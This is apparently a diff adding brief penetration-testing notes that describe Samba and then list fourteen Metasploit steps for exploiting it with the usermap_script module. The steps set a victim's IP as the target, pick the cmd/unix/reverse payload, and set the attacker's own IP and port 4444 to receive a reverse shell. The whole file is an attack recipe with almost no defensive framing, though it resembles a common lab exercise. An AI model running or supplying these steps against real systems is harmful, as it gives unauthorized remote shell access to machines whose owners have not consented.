@@ -1,0 +1,16 @@
+Samba is an open-source project that is widely used on linux and unix computers so they can work with window file and print services.
+We can use samba as an active server to handle login, authentication and access control for a windows network.
+1.	Open a terminal on Kali Linux
+2.	Put in the ‘msfconsole’ command
+3.	Search exploit samba
+4.	Use exploit/multi/samba/usermap_script
+5.	Show options
+6.	Set RHOSTS ip address (victim’s machine)
+7.	Set the payloads
+8.	Show payloads
+9.	Use payload cmd/unix/reverse
+10.	Set required argument for payloads
+11.	Show options
+12.	Set LHOSTS ip address (my ip address)
+13.	Set LPORT 4444
+14.	exploit
